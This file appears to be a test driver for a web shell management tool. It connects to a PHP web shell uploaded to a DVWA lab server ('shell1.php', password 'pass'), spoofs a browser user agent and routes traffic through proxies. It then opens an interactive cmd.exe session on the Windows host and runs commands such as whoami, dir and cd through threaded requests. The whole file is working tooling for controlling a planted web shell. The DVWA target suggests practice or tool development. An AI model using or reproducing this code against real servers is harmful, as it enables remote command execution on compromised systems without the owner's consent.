# -*- encoding: utf-8 -*-

from core.ShellEntity import ShellEntity
from core.ShellService import ShellService
from common import Types
import threading
import time



url = 'http://192.168.217.130/dvwa/hackable/uploads/shell1.php'
ip = url[url.find('//') + 2:url.find(',', url.find('//') + 2)]
print(ip)
shellEntity = ShellEntity(url, ip, 'pass', Types.LanguageType.PHP, os='win')


useAgent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36'
shellService = ShellService(shellEntity, useAgent, isUseProxies=True)

# print(shellService.getBasicInfo())
#print(shellService.runCmd('whoami'))
#print(shellService.runCmd('whoami'))
#print(shellService.getBasicInfo())

# print(shellService.realCMDOperate(Types.RealCMDOperateType.CREATE, 'Cmd.exe')['status'])
# print(shellService.realCMDOperate(Types.RealCMDOperateType.WRITE, 'dir')['status'])
# print(shellService.realCMDOperate(Types.RealCMDOperateType.READ)['msg'])

# time.sleep(2)
# print(shellService.realCMDOperate(Types.RealCMDOperateType.READ)['status'])
def sendRequestRealCMD(realCMDOperateType, bashPath='', cmd='', delayTime=0):
    if delayTime > 0:
        time.sleep(delayTime)
    if realCMDOperateType is Types.RealCMDOperateType.CREATE:
        print(shellService.realCMDOperate(realCMDOperateType, bashPath)['status'])
    if realCMDOperateType is Types.RealCMDOperateType.WRITE:
        print(shellService.realCMDOperate(realCMDOperateType, bashPath, cmd)['status'])
    else:
        print(shellService.realCMDOperate(realCMDOperateType)['msg'])


#
threads = []
t1 = threading.Thread(target=sendRequestRealCMD, args=(Types.RealCMDOperateType.CREATE, 'Cmd.exe'))


# t2 = threading.Thread(target=sendRequestRealCMD, args=(Types.RealCMDOperateType.READ,'','',0))
# t3 = threading.Thread(target=sendRequestRealCMD, args=(Types.RealCMDOperateType.WRITE,'','dir'))

def test():
    time.sleep(2)
    print(shellService.realCMDOperate(Types.RealCMDOperateType.READ)['msg'])
    time.sleep(2)
    print(shellService.realCMDOperate(Types.RealCMDOperateType.WRITE, '', 'dir\n')['status'])
    time.sleep(2)
    print(shellService.realCMDOperate(Types.RealCMDOperateType.READ)['msg'])
    time.sleep(2)
    print(shellService.realCMDOperate(Types.RealCMDOperateType.WRITE, '', 'cd ../\n')['status'])
    time.sleep(2)
    print(shellService.realCMDOperate(Types.RealCMDOperateType.READ)['msg'])
    time.sleep(2)
    print(shellService.realCMDOperate(Types.RealCMDOperateType.WRITE, '', 'dir\n')['status'])
    time.sleep(2)
    print(shellService.realCMDOperate(Types.RealCMDOperateType.READ)['msg'])

t2 = threading.Thread(target=test)
threads.append(t1)
threads.append(t2)
for t in threads:
    t.start()
for t in threads:
    t.join()


# t2.start()

# print(shellService.realCMDOperate(Types.RealCMDOperateType.READ)['msg'])
# print(shellService.realCMDOperate(Types.RealCMDOperateType.WRITE, '', 'dir')['status'])
# time.sleep(2)
# print(shellService.realCMDOperate(Types.RealCMDOperateType.READ)['msg'])
